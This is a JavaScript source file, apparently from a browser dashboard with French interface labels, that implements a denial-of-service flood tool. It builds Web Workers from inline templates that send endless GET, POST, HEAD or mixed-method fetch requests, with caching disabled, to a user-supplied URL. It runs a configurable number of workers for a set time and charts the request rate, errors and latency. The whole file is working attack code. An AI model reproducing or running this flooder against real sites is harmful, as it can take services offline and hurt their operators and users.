var dosRunning = false, dosWorkers = [], dosTimer = null, dosChart = null, spChart = null;
var dosStats = {tot:0, err:0, latSum:0, latN:0};
var dosPrev = 0;
var dosMode = 'get';

var W_TPL = {
    get:   'var c=0,er=0,ls=0,ln=0,alive=true;self.onmessage=function(){alive=false;};setInterval(function(){if(c||er)self.postMessage({c:c,er:er,avgLat:ln?Math.round(ls/ln):0});c=0;er=0;ls=0;ln=0;},200);!function loop(){if(!alive)return;var t=Date.now();fetch(URL,{mode:"no-cors",cache:"no-store"}).then(function(){var l=Date.now()-t;c++;ls+=l;ln++;},function(){er++;c++;});setTimeout(loop,0);}();',
    post:  'var c=0,er=0,ls=0,ln=0,alive=true,bd=Array(512).join("X");self.onmessage=function(){alive=false;};setInterval(function(){if(c||er)self.postMessage({c:c,er:er,avgLat:ln?Math.round(ls/ln):0});c=0;er=0;ls=0;ln=0;},200);!function loop(){if(!alive)return;var t=Date.now();fetch(URL,{method:"POST",mode:"no-cors",cache:"no-store",body:bd}).then(function(){var l=Date.now()-t;c++;ls+=l;ln++;},function(){er++;c++;});setTimeout(loop,0);}();',
    mixed: 'var c=0,er=0,ls=0,ln=0,alive=true,ms=["GET","POST","HEAD","DELETE"];self.onmessage=function(){alive=false;};setInterval(function(){if(c||er)self.postMessage({c:c,er:er,avgLat:ln?Math.round(ls/ln):0});c=0;er=0;ls=0;ln=0;},200);!function loop(){if(!alive)return;var t=Date.now();fetch(URL,{method:ms[Math.floor(Math.random()*4)],mode:"no-cors",cache:"no-store"}).then(function(){var l=Date.now()-t;c++;ls+=l;ln++;},function(){er++;c++;});setTimeout(loop,0);}();',
    slow:  'var c=0,er=0,ls=0,ln=0,alive=true;self.onmessage=function(){alive=false;};setInterval(function(){if(c||er)self.postMessage({c:c,er:er,avgLat:ln?Math.round(ls/ln):0});c=0;er=0;ls=0;ln=0;},200);!function loop(){if(!alive)return;var t=Date.now();fetch(URL,{mode:"no-cors",cache:"no-store"}).then(function(){var l=Date.now()-t;c++;ls+=l;ln++;},function(){er++;c++;});setTimeout(loop,300);}();',
    head:  'var c=0,er=0,ls=0,ln=0,alive=true;self.onmessage=function(){alive=false;};setInterval(function(){if(c||er)self.postMessage({c:c,er:er,avgLat:ln?Math.round(ls/ln):0});c=0;er=0;ls=0;ln=0;},200);!function loop(){if(!alive)return;var t=Date.now();fetch(URL,{method:"HEAD",mode:"no-cors",cache:"no-store"}).then(function(){var l=Date.now()-t;c++;ls+=l;ln++;},function(){er++;c++;});setTimeout(loop,0);}();'
};

function selMode(el){
    document.querySelectorAll('.mode-chip').forEach(function(e){ e.classList.remove('sel'); });
    el.classList.add('sel'); dosMode = el.dataset.mode;
}
function dosPresetChange(){
    var sel = document.getElementById('dos-preset');
    var f = document.getElementById('dos-custom-field');
    f.style.display = sel.value === 'custom' ? 'block' : 'none';
    if(sel.value !== 'custom') document.getElementById('dos-url').value = sel.value;
}
function getDosUrl(){
    var sel = document.getElementById('dos-preset');
    return (sel.value==='custom' ? document.getElementById('dos-url').value : sel.value) +
           document.getElementById('dos-path').value;
}
function toggleDos(){ dosRunning ? stopDos() : startDos(); }

function startDos(){
    var url = getDosUrl();
    var nt  = parseInt(document.getElementById('tc').value);
    var dur = parseInt(document.getElementById('td').value) * 1000;
    if(!url) return;
    dosRunning = true; dosStats = {tot:0,err:0,latSum:0,latN:0}; dosPrev = 0;
    var btn = document.getElementById('dos-btn');
    btn.textContent = '■ Stopper'; btn.className = 'btn btn-stop';
    var st = document.getElementById('dos-st');
    st.textContent = '▶ '+nt+' workers — '+dosMode; st.className = 'status-badge status-running';
    var src = (W_TPL[dosMode]||W_TPL.get).replace(/URL/g, '"'+url+'"');
    var blob = new Blob([src], {type:'text/javascript'});
    var burl = URL.createObjectURL(blob);
    var i = -1;
    while(++i < nt){
        var w = new Worker(burl);
        w.onmessage = function(e){
            dosStats.tot += e.data.c; dosStats.err += e.data.er;
            if(e.data.avgLat > 0){ dosStats.latSum += e.data.avgLat; dosStats.latN++; }
        };
        dosWorkers.push(w);
    }
    URL.revokeObjectURL(burl);
    dosTimer = setInterval(function(){
        var rps = dosStats.tot - dosPrev; dosPrev = dosStats.tot;
        document.getElementById('d-rps').textContent = rps;
        document.getElementById('d-tot').textContent = dosStats.tot;
        document.getElementById('d-err').textContent = dosStats.err;
        var avg = dosStats.latN > 0 ? Math.round(dosStats.latSum/dosStats.latN)+'ms' : '—';
        document.getElementById('d-lat').textContent = avg;
        if(dosChart) dosChart.push(rps);
        if(spChart)  spChart.push(rps);
        G.emit('dos', {
            method: dosMode.toUpperCase(),
            path:   document.getElementById('dos-path').value,
            code:   rps > 0 ? 200 : 0,
            lat:    dosStats.latN > 0 ? Math.round(dosStats.latSum/dosStats.latN) : 0
        });
    }, 1000);
    setTimeout(stopDos, dur);
}
function stopDos(){
    dosRunning = false;
    dosWorkers.forEach(function(w){ w.terminate(); });
    dosWorkers = []; clearInterval(dosTimer);
    var btn = document.getElementById('dos-btn');
    btn.textContent = '▶ Lancer'; btn.className = 'btn btn-primary';
    var st = document.getElementById('dos-st');
    st.textContent = dosStats.tot > 0 ? 'Terminé — '+dosStats.tot+' req' : 'Inactif';
    st.className = 'status-badge '+(dosStats.tot > 0 ? 'status-ok' : 'status-idle');
}
